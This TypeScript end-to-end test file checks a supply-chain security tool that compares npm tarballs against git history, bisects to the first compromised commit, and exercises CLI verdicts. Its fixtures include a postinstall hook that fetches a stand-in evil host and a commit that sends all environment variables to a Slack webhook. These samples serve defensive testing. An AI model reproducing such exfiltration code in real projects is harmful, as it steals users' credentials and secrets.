import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { describe, it } from "node:test";
import { verifyTarballVsGitParity, walkGitHistoryForCleanAnchor } from "../src/analysis/parity-and-bisect.ts";
import { triageUnpackedEntries } from "../src/analysis/static-triage.ts";
import { SplitPlaneCache } from "../src/cache/sqlite-store.ts";
import { DEFAULT_POLICY } from "../src/config/policy.ts";
import { unpackTarballInMemory } from "../src/quarantine/safe-unpack.ts";
import { buildSyntheticTgz } from "./helpers.ts";

function git(args: string[], cwd: string): string {
  return execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
}

describe("E2E: 3-Tier Tarball-vs-Git Parity, Patient-Zero Commit Bisect & CLI Execution", () => {
  it("distinguishes compiled TypeScript dist/ from tarball-only script injection and resolves patient-zero commit", async () => {
    const repoDir = mkdtempSync(join(tmpdir(), "coldpin-e2e-"));
    const cache = new SplitPlaneCache(":memory:");
    try {
      git(["init", "-b", "main"], repoDir);
      git(["config", "user.name", "Test Bot"], repoDir);
      git(["config", "user.email", "test@example.com"], repoDir);

      // Commit 1 (root): clean v1.0.0
      writeFileSync(
        join(repoDir, "package.json"),
        JSON.stringify({ name: "@demo/tool", version: "1.0.0", license: "MIT", bin: { demo: "./dist/cli.js" } }, null, 2),
      );
      writeFileSync(join(repoDir, "tsconfig.json"), JSON.stringify({ compilerOptions: { outDir: "dist" } }));
      mkdirSync(join(repoDir, "src"), { recursive: true });
      writeFileSync(join(repoDir, "src", "cli.ts"), "export const ok: string = 'hello'; console.log(ok);\n");
      git(["add", "."], repoDir);
      git(["commit", "-m", "feat: initial clean v1.0.0"], repoDir);
      const commit1 = git(["rev-parse", "HEAD"], repoDir);

      // Commit 2: clean v1.1.0
      writeFileSync(
        join(repoDir, "package.json"),
        JSON.stringify({ name: "@demo/tool", version: "1.1.0", license: "MIT", bin: { demo: "./dist/cli.js" } }, null, 2),
      );
      writeFileSync(join(repoDir, "README.md"), "# Demo Tool v1.1.0\n");
      git(["add", "."], repoDir);
      git(["commit", "-m", "chore: release 1.1.0"], repoDir);
      const commit2 = git(["rev-parse", "HEAD"], repoDir);

      // --- 3-Tier Parity Test A: Legitimate compiled dist/cli.js tarball matching Commit 2 ---
      const compiledTgz = buildSyntheticTgz([
        {
          name: "package/package.json",
          content: JSON.stringify({ name: "@demo/tool", version: "1.1.0", license: "MIT", bin: { demo: "./dist/cli.js" } }, null, 2),
        },
        { name: "package/dist/cli.js", content: "console.log('hello');\n" },
      ]);
      const unpackedCompiled = await unpackTarballInMemory(compiledTgz, DEFAULT_POLICY);
      const triagedCompiled = triageUnpackedEntries(unpackedCompiled.entries, DEFAULT_POLICY);
      const parityCompiled = await verifyTarballVsGitParity({
        tarballManifest: triagedCompiled.manifest,
        tarballEntries: unpackedCompiled.entries,
        provenanceAttested: false,
        gitHead: commit2,
        localGitDir: repoDir,
      });
      assert.equal(parityCompiled.tier, "COMPILED_DIST_UNATTESTED");
      assert.equal(parityCompiled.observations.length, 0);

      // --- 3-Tier Parity Test B: Tarball-only postinstall injection (Git clean, tarball poisoned!) ---
      const driftedTgz = buildSyntheticTgz([
        {
          name: "package/package.json",
          content: JSON.stringify({
            name: "@demo/tool",
            version: "1.1.0",
            license: "MIT",
            bin: { demo: "./dist/cli.js" },
            scripts: { postinstall: "node -e 'fetch(\"https://evil.test\")'" },
          }),
        },
        { name: "package/dist/cli.js", content: "console.log('hello');\n" },
      ]);
      const unpackedDrifted = await unpackTarballInMemory(driftedTgz, DEFAULT_POLICY);
      const triagedDrifted = triageUnpackedEntries(unpackedDrifted.entries, DEFAULT_POLICY);
      const parityDrifted = await verifyTarballVsGitParity({
        tarballManifest: triagedDrifted.manifest,
        tarballEntries: unpackedDrifted.entries,
        provenanceAttested: false,
        gitHead: commit2,
        localGitDir: repoDir,
      });
      assert.equal(parityDrifted.tier, "TARBALL_SOURCE_DRIFT");
      assert.ok(parityDrifted.observations.some((o) => o.code === "TARBALL_SOURCE_DRIFT_SCRIPTS"));

      // Commit 3 (PATIENT ZERO): attacker injects credential exfiltration
      writeFileSync(
        join(repoDir, "src", "cli.ts"),
        `const dump = JSON.stringify(process.env); fetch("https://hooks.slack.com/services/T1/B1/SECRET", { method: "POST", body: dump });\n`,
      );
      git(["add", "."], repoDir);
      git(["commit", "-m", "fix: minor perf tweak"], repoDir);
      const commit3PatientZero = git(["rev-parse", "HEAD"], repoDir);

      // Commit 4 (HEAD): benign README edit on top of infected Commit 3
      writeFileSync(join(repoDir, "README.md"), "# Demo Tool v1.1.1\nUpdated docs.\n");
      git(["add", "."], repoDir);
      git(["commit", "-m", "docs: fix typo"], repoDir);

      // --- Bisect Test 1: Verified npm release mapped to Commit 2 -> ROLLBACK_TO_SAFE_ANCHOR ---
      const releaseMap = new Map([
        [commit2, { version: "1.1.0", tarball_sha512: unpackedCompiled.tarball_sha512, provenance_attested: true }],
      ]);
      const decisionRollback = await walkGitHistoryForCleanAnchor({
        package_name: "@demo/tool",
        repoUrlOrLocalPath: repoDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        cache,
        releaseTarballByCommit: releaseMap,
      });
      assert.equal(decisionRollback.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.equal(decisionRollback.compromised_latest.patient_zero_sha, commit3PatientZero);
      assert.equal(decisionRollback.safe_anchor?.commit_sha, commit2);
      assert.equal(decisionRollback.safe_anchor?.version, "1.1.0");
      assert.ok(decisionRollback.safe_anchor?.pinned_execution.command?.includes("@demo/tool@1.1.0"));
      // Verify SQLite blob cache hit on unchanged blobs across commits
      assert.ok(decisionRollback.inspected_commits.some((c) => c.cache_hits > 0));

      // --- Bisect Test 2: Commit 2 has NO verified npm tarball -> FORENSIC_COMMIT_ONLY (no unsafe npx github:...) ---
      const decisionForensic = await walkGitHistoryForCleanAnchor({
        package_name: "@demo/tool",
        repoUrlOrLocalPath: repoDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        cache,
      });
      assert.equal(decisionForensic.recommended_action, "FORENSIC_COMMIT_ONLY");
      assert.equal(decisionForensic.safe_anchor?.pinned_execution.command, null);

      // --- Bisect Test 3: Commit 2 has a CISA KEV CVE -> SWITCH_TO_ALTERNATIVE ---
      const kevMap = new Map([
        [
          commit2,
          [
            {
              id: "CVE-2026-99999",
              is_malicious: false,
              severity: "CRITICAL" as const,
              kev: true,
              summary: "Remote code execution in transitive parser",
              package_name: "@demo/tool",
            },
          ],
        ],
      ]);
      const decisionPivot = await walkGitHistoryForCleanAnchor({
        package_name: "@demo/tool",
        repoUrlOrLocalPath: repoDir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        cache,
        releaseTarballByCommit: releaseMap,
        residualAdvisoriesByCommit: kevMap,
        alternatives: [
          {
            package_name: "@clean-org/tool",
            version: "3.0.0",
            org_or_scope: "@clean-org",
            verdict: "VERIFIED_CLEAN_WITHIN_SCOPE",
            pinned_command: "npx --yes --ignore-scripts --package=@clean-org/tool@3.0.0 -- tool",
            reason: "Clean alternative in same category with SLSA provenance.",
          },
        ],
      });
      assert.equal(decisionPivot.recommended_action, "SWITCH_TO_ALTERNATIVE");
      assert.equal(decisionPivot.alternatives.length, 1);

      // --- Live CLI Subprocess E2E Verification (exit codes + stdout JSON + audit-verify) ---
      const cliPath = resolve("src/cli.ts");
      const driftedPath = join(repoDir, "drifted.tgz");
      const auditPath = join(repoDir, "audit.jsonl");
      writeFileSync(driftedPath, driftedTgz);

      let exitCode = 0;
      let stdout = "";
      try {
        stdout = execFileSync(
          process.execPath,
          ["--no-warnings", cliPath, "inspect", "--tarball", driftedPath, "--git-dir", repoDir, "--offline", "--json", "--audit-log", auditPath],
          { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
        );
      } catch (err) {
        const e = err as { status?: number; stdout?: string };
        exitCode = e.status ?? 1;
        stdout = e.stdout ?? "";
      }
      assert.equal(exitCode, 3); // MALICIOUS_INDICATORS_FOUND
      const parsedReport = JSON.parse(stdout) as { verdict: string; info: { parity_tier: string } };
      assert.equal(parsedReport.verdict, "MALICIOUS_INDICATORS_FOUND");
      assert.equal(parsedReport.info.parity_tier, "TARBALL_SOURCE_DRIFT");

      // Verify CLI audit-verify returns exit 0 on the generated audit log
      const auditOut = execFileSync(
        process.execPath,
        ["--no-warnings", cliPath, "audit-verify", auditPath],
        { encoding: "utf8" },
      );
      const auditRes = JSON.parse(auditOut) as { valid: boolean; total_events: number };
      assert.equal(auditRes.valid, true);
      assert.equal(auditRes.total_events, 1);

      // Verify CLI resolve-anchor on local Git repo
      let anchorExit = 0;
      let anchorOut = "";
      try {
        anchorOut = execFileSync(
          process.execPath,
          ["--no-warnings", cliPath, "resolve-anchor", "@demo/tool", "--git-dir", repoDir, "--offline", "--json"],
          { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
        );
      } catch (err) {
        const e = err as { status?: number; stdout?: string };
        anchorExit = e.status ?? 1;
        anchorOut = e.stdout ?? "";
      }
      assert.equal(anchorExit, 2); // FORENSIC_COMMIT_ONLY
      const anchorJson = JSON.parse(anchorOut) as { compromised_latest: { patient_zero_sha: string }; safe_anchor: { commit_sha: string } };
      assert.equal(anchorJson.compromised_latest.patient_zero_sha, commit3PatientZero);
      assert.equal(anchorJson.safe_anchor.commit_sha, commit2);
      assert.ok(commit1.length === 40);

      // Verify CLI verify-confusion catches unpinned private scope & unscoped internal prefix (exit 3)
      const confDir = join(repoDir, "conf-check");
      mkdirSync(confDir, { recursive: true });
      writeFileSync(
        join(confDir, ".coldpin.policy.json"),
        JSON.stringify({ private_scopes: ["@acme"], private_prefixes: ["acme-internal-"] }),
      );
      writeFileSync(
        join(confDir, "package.json"),
        JSON.stringify({ name: "app", dependencies: { "@acme/cli": "^1.0.0", "acme-internal-tool": "^2.0.0" } }),
      );
      let confExit = 0;
      let confOut = "";
      try {
        confOut = execFileSync(
          process.execPath,
          ["--no-warnings", cliPath, "verify-confusion", join(confDir, "package.json"), "--policy", join(confDir, ".coldpin.policy.json"), "--offline"],
          { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
        );
      } catch (err) {
        const e = err as { status?: number; stdout?: string };
        confExit = e.status ?? 1;
        confOut = e.stdout ?? "";
      }
      assert.equal(confExit, 3);
      const confJson = JSON.parse(confOut) as { passed: boolean; findings: Array<{ issue: string }> };
      assert.equal(confJson.passed, false);
      assert.ok(confJson.findings.some((f) => f.issue === "UNPINNED_PRIVATE_SCOPE"));
      assert.ok(confJson.findings.some((f) => f.issue === "UNSCOPED_PRIVATE_PREFIX"));
    } finally {
      cache.close();
      rmSync(repoDir, { recursive: true, force: true });
    }
  });
});
